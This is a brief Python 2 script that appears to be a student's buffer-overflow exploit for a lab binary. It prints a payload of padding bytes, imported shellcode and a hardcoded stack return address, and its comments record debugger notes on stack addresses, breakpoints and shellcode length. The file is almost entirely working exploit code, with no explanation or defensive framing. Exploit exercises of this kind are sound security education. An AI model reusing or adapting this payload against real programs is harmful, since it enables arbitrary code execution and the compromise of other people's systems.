from shellcode import shellcode
print '\x10'+'\x00'+'\x00'+'\x40' +'C'*9*8 +shellcode+ '\x00'+ 'A'*2*8+'D'*12+ '\x08\xde\xfe\xbf'
#8*4 bytes? 0xbffeff70 is where my shell starts
#shellcode=23, so need 24 bytes
#print '\x9c'+'\xbf'+'\x1f'+'\x00'+'B'*2097152*8 lowes safe

#0xbffeffa4: ret addr0x08048f2b
#x/100x $esp+8339999'\x94\xff\xfe\xbf'

# break here 0x08048f2c,  b *0x08048f2c
#0xbffeffa8

#VM
#0xbffede08: is where my shell starts